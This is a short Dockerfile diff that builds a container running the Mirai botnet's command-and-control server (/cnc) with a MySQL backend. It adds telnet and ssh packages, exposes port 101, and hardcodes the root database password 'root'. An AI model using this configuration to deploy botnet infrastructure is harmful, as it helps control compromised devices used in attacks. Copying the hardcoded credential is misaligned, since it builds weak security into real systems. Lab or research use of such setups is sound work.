@@ -3,7 +3,7 @@ ADD ./source/mirai/debug/cnc /cnc
 ADD ./source/scripts/db.sql /db.sql
 RUN apt-get -y update \
 	&& apt-get upgrade -y \
-	&& apt-get install -y wget bzip2 nano golang\
+	&& apt-get install -y wget bzip2 nano golang telnet ssh\
 	&& echo "#!/bin/sh\nexit 0" > /usr/sbin/policy-rc.d \
 	&& apt-get install -y debconf-utils \
 	&& echo mysql-server mysql-server/root_password password root | debconf-set-selections \
@@ -12,4 +12,4 @@ RUN apt-get -y update \
 	&& apt-get install -y mysql-client \
 	&& mysql -u root -p"root" < /db.sql
 CMD service mysql start && /cnc
-EXPOSE 23 3306
+EXPOSE 23 101 3306
